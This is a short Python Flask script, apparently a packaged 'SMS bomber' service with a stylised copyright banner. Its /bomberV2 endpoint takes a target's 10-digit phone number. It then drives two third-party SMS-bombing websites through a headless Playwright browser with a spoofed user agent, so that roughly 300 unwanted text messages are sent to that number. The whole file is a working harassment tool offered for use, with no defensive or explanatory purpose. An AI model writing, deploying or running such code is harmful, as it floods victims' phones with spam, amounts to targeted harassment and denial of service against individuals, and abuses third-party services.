from flask import Flask, request, jsonify
from playwright.sync_api import sync_playwright
import time

#╔═══════════════════════════╗
#║                                            
#║    𝗖𝗼𝗽𝘆𝗿𝗶𝗴𝗵𝘁 © 𝟮𝟬𝟮𝟰 𝗬𝗨𝗩𝗥𝗔𝗝𝗠𝗢𝗗𝗭     
#║     𝗖𝗥𝗘𝗗𝗜𝗧: 𝐌𝐀𝐓𝐑𝐈𝐗 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑      
#║                                            
#╚═══════════════════════════╝

app = Flask(__name__)

@app.route('/bomberV2', methods=['GET'])
def sms_bomber():
    phone_number = request.args.get('target')
    
    if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
        return jsonify({"error": "Invalid phone number. Please enter a 10-digit number."}), 400

    url1 = "https://mytoolstown.com/smsbomber/#bestsmsbomber"
    url2 = "https://greatonlinetools.com/smsbomber/#smsbomber"
    sms_count1 = "200"
    sms_count2 = "100"

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
            )
            
            page1 = context.new_page()
            page1.goto(url1)
            page1.wait_for_load_state("load")
            page1.fill('input#mobno', phone_number)
            page1.fill('input#count', sms_count1)
            page1.click('button#startsms')
            
            page2 = context.new_page()
            page2.goto(url2)
            page2.wait_for_load_state("load")
            page2.fill('input#mobile', phone_number)
            page2.fill('input#count', sms_count2)
            page2.click('button#start')
            
            time.sleep(300)
            browser.close()
        
        return jsonify({
            "bomber": "success",
            "targeted_number": phone_number,
            "bomber_speed": "Fast"
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5064)